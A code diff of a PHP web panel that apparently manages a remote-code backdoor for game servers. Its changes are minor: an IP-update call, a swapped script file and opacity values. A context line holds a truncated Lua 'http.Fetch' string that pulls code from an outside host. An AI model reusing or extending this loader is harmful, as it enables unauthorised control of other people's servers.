@@ -15,6 +15,8 @@ if(!$Local::IsActive()) { $Local::Redirect("invalid session"); }
 
 if($Local::IsBlacklisted()) { $Local::Redirect("blacklisted"); }
 
+$Local::UpdateIp(); // updates ip if it has changed at all
+
 // if discords null & localinfo exists
 // just a dumb error ez fix ;0 ;0 ;0
 if($discord == "NULL" && !empty($LocalInfo)) {
@@ -27,7 +29,7 @@ $private = "http.Fetch('https://w0rst.xyz/project/func/napalm.php?type=private&t
 
 ?>
 
-<script src="js/redirect.js"></script>
+<script src="js/custom.js"></script>
 <script src="js/snowstorm.js"></script>
 <div class="nav-container"> 
     <div class="navbar">
@@ -88,10 +90,10 @@ $private = "http.Fetch('https://w0rst.xyz/project/func/napalm.php?type=private&t
 
     if(isvalid == true) {
         switch($(".webpage").attr('id')) {
-            case "home": $('#1').css("opacity", "1"); break;
-            case "members": $('#2').css("opacity", "1"); break;
-            case "servers": $('#3').css("opacity", "1"); break;
-            case "logging": $('#4').css("opacity", "1"); break;
+            case "home": $('#1').css("opacity", "85%"); break;
+            case "members": $('#2').css("opacity", "85%"); break;
+            case "servers": $('#3').css("opacity", "85%"); break;
+            case "logging": $('#4').css("opacity", "85%"); break;
         }
     }
     
